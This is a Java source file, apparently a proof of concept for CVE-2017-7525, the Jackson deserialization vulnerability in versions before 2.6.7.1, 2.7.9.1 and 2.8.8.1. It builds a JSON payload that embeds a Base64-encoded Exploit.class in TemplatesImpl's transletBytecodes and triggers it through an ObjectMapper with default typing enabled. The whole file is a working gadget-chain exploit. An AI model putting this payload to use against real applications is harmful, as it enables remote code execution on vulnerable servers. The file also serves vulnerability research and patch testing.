package com.yyjccc.jackson.vul;


import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.springframework.util.FileCopyUtils;

import java.io.*;

/**
 * @author  yyjccc
 * @components jackson
 * @cve: CVE-2017-7525
 * @time  2024-2-23
 * @version
 * <pre>
 *  2.6系列 < 2.6.7.1
 *  2.7系列 < 2.7.9.1
 *  2.8系列 < 2.8.8.1
 * </pre>
 * @description jackson反序列化漏洞TemplatesImpl利用链
 */
public class TemplatesImplGadget {
	public static void main(String[] args) throws FileNotFoundException {
		String expdata= getExpData();
		System.out.println(expdata);
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		Entity entity;
		try {
			entity = mapper.readValue(expdata, Entity.class);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


	public static String getExpData() throws FileNotFoundException {
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		try {
			FileCopyUtils.copy(new FileInputStream(new File("fastjson_Exp/target/classes/com/yyjccc/jackson/vul/Exploit.class")),byteArrayOutputStream);
		} catch (IOException e) {
			e.printStackTrace();
		}
		String exp= Base64.encode(byteArrayOutputStream.toByteArray());


		String data="{\"data\":\n[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{" +
				"\"transletBytecodes\":[\""+exp+"\"]," +
				"\"transletName\":\"entity\"," +
				"\"outputProperties\":{}" +
				"}\n ]  \n}";
		return data;
	}
}
